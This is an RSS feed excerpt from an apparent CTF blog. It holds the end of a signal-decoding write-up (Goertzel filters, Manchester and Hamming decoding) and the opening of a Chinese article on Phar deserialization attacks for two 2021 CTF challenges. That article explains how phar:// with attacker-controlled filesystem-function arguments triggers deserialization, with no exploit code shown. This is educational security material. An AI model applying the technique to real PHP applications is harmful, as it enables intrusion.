class=&#34;built_in&#34;&gt;int&lt;/span&gt;(bit_string[start:end],&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;)) + message&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(message)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# set target frequencies&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;mark_freq = &lt;span class=&#34;number&#34;&gt;1270&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;space_freq = &lt;span class=&#34;number&#34;&gt;1070&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# create two filters&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;mark_filter = Goertzel(rate, mark_freq)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;space_filter = Goertzel(rate, space_freq)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# calculate coefficients for each filter&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;mark_filter.calculate_coeff()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;space_filter.calculate_coeff()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;bit_string = &lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;message = &lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; i &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(data.size + &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;# for each chunk of 160 samples&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; i%&lt;span class=&#34;number&#34;&gt;160&lt;/span&gt; == &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;and&lt;/span&gt; i != &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        start = i - &lt;span class=&#34;number&#34;&gt;160&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        end = i&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        samples = data[start:end]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;comment&#34;&gt;# get amplitutes of sample set&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        mark_amp = mark_filter.&lt;span class=&#34;built_in&#34;&gt;filter&lt;/span&gt;(samples)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        space_amp = space_filter.&lt;span class=&#34;built_in&#34;&gt;filter&lt;/span&gt;(samples)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; mark_amp &amp;gt; space_amp:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            to_add = &lt;span class=&#34;string&#34;&gt;&amp;#x27;1&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            to_add = &lt;span class=&#34;string&#34;&gt;&amp;#x27;0&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        bit_string = to_add + bit_string&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;HammingBolck&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;message&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;assert&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;len&lt;/span&gt;(message)==&lt;span class=&#34;number&#34;&gt;15&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    message=message[::-&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    code = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    m_pos = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; ind &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;20&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (ind+&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;)&amp;amp;(ind): &lt;span class=&#34;comment&#34;&gt;# Not parity check bit&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;int&lt;/span&gt;(message[m_pos],&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                code = code ^ (&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&amp;lt;&amp;lt;ind)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                code = code ^ (((ind+&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;)&amp;amp;&lt;span class=&#34;number&#34;&gt;0b1&lt;/span&gt;)&amp;lt;&amp;lt;&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                code = code ^ (((ind+&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;)&amp;amp;&lt;span class=&#34;number&#34;&gt;0b10&lt;/span&gt;)&amp;lt;&amp;lt;&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                code = code ^ (((ind+&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;)&amp;amp;&lt;span class=&#34;number&#34;&gt;0b100&lt;/span&gt;)&amp;lt;&amp;lt;&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                code = code ^ (((ind+&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;)&amp;amp;&lt;span class=&#34;number&#34;&gt;0b1000&lt;/span&gt;)&amp;lt;&amp;lt;&lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            m_pos = m_pos + &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    code = code ^ (&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&amp;lt;&amp;lt;random.randint(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;19&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    retStr = &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;#123;0:020b&amp;#125;&amp;quot;&lt;/span&gt;.&lt;span class=&#34;built_in&#34;&gt;format&lt;/span&gt;(code)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;from &amp;quot;&lt;/span&gt;+message+&lt;span class=&#34;string&#34;&gt;&amp;quot; to &amp;quot;&lt;/span&gt;+retStr)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; retStr&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;HammingBolckInv&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;message&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;assert&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;len&lt;/span&gt;(message)==&lt;span class=&#34;number&#34;&gt;20&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    code = &lt;span class=&#34;built_in&#34;&gt;int&lt;/span&gt;(message,&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    wrong = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; ind &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;20&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&amp;lt;&amp;lt;ind)&amp;amp;code:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            wrong = wrong ^ (ind+&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; wrong:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        code = code ^ (&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&amp;lt;&amp;lt;(wrong-&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    retStr = &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; ind &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;20&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (ind+&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;)&amp;amp;(ind): &lt;span class=&#34;comment&#34;&gt;# Not parity check bit&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            retStr = retStr + (&lt;span class=&#34;string&#34;&gt;&amp;quot;1&amp;quot;&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; code&amp;amp;(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&amp;lt;&amp;lt;ind) &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;0&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; retStr[::-&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;Hamming&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;message&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    retStr = &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; ind &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;built_in&#34;&gt;len&lt;/span&gt;(message),&lt;span class=&#34;number&#34;&gt;15&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        retStr = retStr + HammingBolck(message[ind:ind+&lt;span class=&#34;number&#34;&gt;15&lt;/span&gt;])&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; retStr&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;HammingInv&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;message&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    retStr = &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; ind &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;built_in&#34;&gt;len&lt;/span&gt;(message),&lt;span class=&#34;number&#34;&gt;20&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        retStr = retStr + HammingBolckInv(message[ind:ind+&lt;span class=&#34;number&#34;&gt;20&lt;/span&gt;])&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; retStr&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;manchester&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;message&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    retStr = &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; char &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; message:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        retStr += &lt;span class=&#34;string&#34;&gt;&amp;quot;01&amp;quot;&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; char==&lt;span class=&#34;string&#34;&gt;&amp;#x27;1&amp;#x27;&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;10&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; retStr&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;manchesterInv&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;message&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    retStr = &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; ind &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;built_in&#34;&gt;len&lt;/span&gt;(message), &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        char = message[ind]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        retStr += &lt;span class=&#34;string&#34;&gt;&amp;quot;0&amp;quot;&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; char==&lt;span class=&#34;string&#34;&gt;&amp;#x27;1&amp;#x27;&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;1&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; retStr&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;bit_string=bit_string[::-&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;bit_string = HammingInv(manchesterInv(bit_string))[::-&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; x &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;10&lt;/span&gt;, &lt;span class=&#34;built_in&#34;&gt;len&lt;/span&gt;(bit_string)+&lt;span class=&#34;number&#34;&gt;10&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; x%&lt;span class=&#34;number&#34;&gt;10&lt;/span&gt; == &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        start = x - &lt;span class=&#34;number&#34;&gt;9&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        end = x - &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        message = &lt;span class=&#34;built_in&#34;&gt;chr&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;int&lt;/span&gt;(bit_string[start:end],&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;)) + message&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(message)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h3 id=&#34;7-Final-Words&#34;&gt;&lt;a href=&#34;#7-Final-Words&#34; class=&#34;headerlink&#34; title=&#34;7. Final Words&#34;&gt;&lt;/a&gt;7. Final Words&lt;/h3&gt;&lt;p&gt;In my eyes, a good misc problem should not be an annoying puzzle. Steps to solve a misc problem have to be reasonable. For example, in this problem, Manchester coding is applied after the application of Hamming coding: that’s because the former is channel coding, and the latter is source coding. We shouldn’t just pick some random encryption and apply it to plaintext.&lt;/p&gt;
&lt;p&gt; I have made my best to make the solving process more natural. I hope you enjoy digging deep into the problem. You’ll earn much more fun than those who can just use tools written by others without understanding fundamental principles (like me).&lt;/p&gt;
&lt;p&gt;ご武運を！&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">http://cubicy.icu/2021/11/28/%E6%B5%85%E8%B0%88Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%EF%BC%9AN1CTF%202021%20easyphp%20&amp;%20%E5%AE%89%E6%B4%B5%E6%9D%AF2021%20EZ_TP/</guid>
            <title>浅谈Phar反序列化漏洞利用：N1CTF 2021 easyphp &amp; 安洵杯2021 EZ_TP</title>
            <link>http://cubicy.icu/2021/11/28/%E6%B5%85%E8%B0%88Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%EF%BC%9AN1CTF%202021%20easyphp%20&amp;%20%E5%AE%89%E6%B4%B5%E6%9D%AF2021%20EZ_TP/</link>
            <category>Phar</category>
            <category>反序列化</category>
            <category>PHP</category>
            <pubDate>Sun, 28 Nov 2021 13:35:00 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;Phar&#34;&gt;&lt;a href=&#34;#Phar&#34; class=&#34;headerlink&#34; title=&#34;Phar&#34;&gt;&lt;/a&gt;Phar&lt;/h1&gt;&lt;h2 id=&#34;什么是Phar&#34;&gt;&lt;a href=&#34;#什么是Phar&#34; class=&#34;headerlink&#34; title=&#34;什么是Phar&#34;&gt;&lt;/a&gt;什么是Phar&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;PHp ARchive, like a Java JAR, but for PHP.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;phar（PHp ARchive）是类似于JAR的一种打包文件。PHP ≥5.3对Phar后缀文件是默认开启支持的，不需要任何其他的安装就可以使用它。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;phar扩展提供了一种将整个PHP应用程序放入.phar文件中的方法，以方便移动、安装。.phar文件的最大特点是将几个文件组合成一个文件的便捷方式，.phar文件提供了一种将完整的PHP程序分布在一个文件中并从该文件中运行的方法。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;说白了，就是一种压缩文件，但是不止能放压缩文件进去。&lt;/p&gt;
&lt;p&gt;在做进一步探究之前需要先调整配置，因为对于Phar文件的相关操作，php缺省状态是只读的（也就是说单纯使用Phar文件不需要任何的调整配置）。但是因为我们现在需要创建一个自己的Phar文件，所以需要允许写入Phar文件，这需要修改一下 &lt;code&gt;php.ini&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;打开 &lt;code&gt;php.ini&lt;/code&gt;，找到 &lt;code&gt;phar.readonly&lt;/code&gt; 指令行，修改成：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;phar.readonly = 0&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;即可。&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&#34;Phar文件格式&#34;&gt;&lt;a href=&#34;#Phar文件格式&#34; class=&#34;headerlink&#34; title=&#34;Phar文件格式&#34;&gt;&lt;/a&gt;Phar文件格式&lt;/h2&gt;&lt;p&gt;Phar文件由四部分组成：&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;1.stub&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;stub是phar文件的文件头，格式为&lt;code&gt;xxxxxx&amp;lt;?php ...;__HALT_COMPILER();?&amp;gt;&lt;/code&gt;，xxxxxx可以是任意字符，包括留空，且php闭合符与最后一个分号之间不能有多于一个的空格符。另外php闭合符也可省略。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;2.manifest describing the contents&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;该区域存放phar包的属性信息，允许每个文件指定文件压缩、文件权限，甚至是用户定义的元数据，如文件用户或组。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2021/11/28/%E6%B5%85%E8%B0%88Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%EF%BC%9AN1CTF%202021%20easyphp%20&amp;%20%E5%AE%89%E6%B4%B5%E6%9D%AF2021%20EZ_TP/format.png&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;p&gt;这里面的metadata以serialize形式储存，为反序列化漏洞埋下了伏笔。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;3.file contents&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;被压缩的用户添加的文件内容&lt;/p&gt;
&lt;p&gt;4.&lt;strong&gt;signature&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;可选，phar文件的签名，允许的有MD5, SHA1, SHA256, SHA512和OPENSSL.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2021/11/28/%E6%B5%85%E8%B0%88Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%EF%BC%9AN1CTF%202021%20easyphp%20&amp;%20%E5%AE%89%E6%B4%B5%E6%9D%AF2021%20EZ_TP/signature.png&#34; alt=&#34;signature&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;p&gt;这部分以&lt;code&gt;GBMB&lt;/code&gt;（47 42 4d 42）结尾。&lt;/p&gt;
&lt;p&gt;需要注意，stub不一定要在文件开头。&lt;/p&gt;
&lt;h2 id=&#34;利用方式&#34;&gt;&lt;a href=&#34;#利用方式&#34; class=&#34;headerlink&#34; title=&#34;利用方式&#34;&gt;&lt;/a&gt;利用方式&lt;/h2&gt;&lt;p&gt;在2018 Black Hat上，安全研究员&lt;code&gt;Sam Thomas&lt;/code&gt;分享了议题&lt;code&gt;It’s a PHP unserialization vulnerability Jim, but not as we know it&lt;/code&gt; .&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://i.blackhat.com/us-18/Thu-August-9/us-18-Thomas-Its-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-Know-It-wp.pdf&#34;&gt;https://i.blackhat.com/us-18/Thu-August-9/us-18-Thomas-Its-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-Know-It-wp.pdf&lt;/a&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;利用phar文件会以序列化的形式存储用户自定义的&lt;strong&gt;meta-data&lt;/strong&gt;这一特性，拓展了php反序列化漏洞的攻击面。该方法在&lt;strong&gt;文件系统函数&lt;/strong&gt;（file_exists()、is_dir()等）参数可控的情况下，配合&lt;strong&gt;phar:&amp;#x2F;&amp;#x2F;伪协议&lt;/strong&gt;，&lt;strong&gt;可以不依赖unserialize()直接进行反序列化操作&lt;/strong&gt;。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;也就是说，如果我们能控制传入以下函数的参数，就有潜在的phar反序列化漏洞利用可能：&lt;/p&gt;
